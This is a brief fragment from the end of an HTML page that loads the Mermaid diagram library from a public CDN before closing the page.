        <script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
      
    
  </body>
</html>